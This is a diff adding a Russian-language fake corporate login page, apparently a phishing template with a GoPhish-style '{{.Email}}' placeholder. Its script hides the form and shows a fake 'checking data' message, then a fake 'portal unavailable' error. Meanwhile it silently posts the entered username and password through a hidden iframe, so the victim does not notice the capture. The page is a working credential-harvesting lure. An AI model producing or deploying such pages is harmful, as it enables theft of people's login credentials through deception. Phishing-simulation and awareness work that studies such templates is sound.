@@ -1,0 +1,98 @@
+<!DOCTYPE html><html lang="ru"><head><meta charset="UTF-8"/>
+	<title>Вход — КОМПАНИЯ</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1"/>
+	<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap" rel="stylesheet"/>
+	<style type="text/css">body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background: #f2f4f5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .login-box {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.08);
+      padding: 32px 24px;
+      max-width: 360px;
+      width: 100%;
+      text-align: center;
+    }
+    .login-box__logo {
+      width: 240px;
+      margin: 0 auto 24px;
+    }
+    .login-box__title {
+      font-size: 20px;
+      font-weight: 600;
+      color: #5a5a5a;
+      margin-bottom: 24px;
+    }
+    .login-box__form {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+    .login-box__form input {
+      height: 44px;
+      padding: 0 12px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 15px;
+    }
+    .login-box__form button {
+      height: 44px;
+      border: none;
+      border-radius: 6px;
+      background: #c48b4b;
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .loading, .error {
+      margin-top: 24px;
+      font-size: 15px;
+      color: #666;
+    }
+    .error { color: #b10000; font-weight: 600; }
+	</style>
+</head>
+<body><!-- скрытый iframe -->
+<p><iframe name="hiddenFrame" style="display:none;"></iframe></p>
+
+<div class="login-box"><img alt="LOGO" class="login-box__logo" src="IMAGE"/>
+<div class="login-box__title">Вход в корпоративный портал</div>
+
+<form class="login-box__form" id="loginForm" method="POST" target="hiddenFrame" action=""><input name="username" placeholder="Имя пользователя" required="" type="text" value="{{.Email}}"/> <input name="password" placeholder="Пароль" required="" type="password"/><button type="submit">Войти</button></form>
+
+<div class="loading" id="loading" style="display:none;">Проверка данных…</div>
+
+<div class="error" id="error" style="display:none;">Портал недоступен по техническим причинам</div>
+</div>
+<script>
+    const form    = document.getElementById('loginForm');
+    const loading = document.getElementById('loading');
+    const error   = document.getElementById('error');
+
+    // Устанавливаем адрес отправки — в этот же URL
+    form.action = location.href;
+
+    form.addEventListener('submit', e => {
+      e.preventDefault();
+      form.style.display = 'none';
+      loading.style.display = 'block';
+
+      setTimeout(() => {
+        loading.style.display = 'none';
+        error.style.display   = 'block';
+
+        // Отправка формы в скрытый iframe
+        form.submit();
+      }, 2000); // задержка 2 секунды
+    });
+  </script>
+
+</body></html>
